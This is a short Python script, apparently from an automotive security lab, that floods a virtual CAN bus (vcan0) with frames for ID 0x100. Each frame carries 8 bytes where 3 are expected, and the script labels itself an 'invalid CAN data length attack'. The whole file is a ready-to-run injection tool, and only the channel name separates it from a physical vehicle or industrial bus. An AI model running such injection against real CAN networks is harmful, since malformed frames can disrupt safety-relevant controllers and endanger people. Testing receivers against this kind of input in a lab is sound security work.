import can
import time


ATTACK_CAN_ID = 0x100

bus = can.Bus(
    interface="socketcan",
    channel="vcan0"
)


print("=" * 60)
print(" INVALID CAN DATA LENGTH ATTACK")
print("=" * 60)
print()
print("Target CAN ID : 0x100")
print("Expected size : 3 bytes")
print("Attack size   : 8 bytes")
print()
print("Press CTRL+C to stop.")
print("=" * 60)
print()


try:

    while True:

        message = can.Message(
            arbitration_id=ATTACK_CAN_ID,
            data=[
                0x03,
                0xE8,
                0x00,
                0xDE,
                0xAD,
                0xBE,
                0xEF,
                0xFF
            ],
            is_extended_id=False
        )

        bus.send(message)

        print(
            f"ATTACK -> ID=0x{ATTACK_CAN_ID:03X} "
            f"DATA={message.data.hex(' ')} "
            f"LENGTH={len(message.data)}"
        )

        time.sleep(1)

except KeyboardInterrupt:

    print()
    print("Invalid length attack stopped.")

finally:

    bus.shutdown()
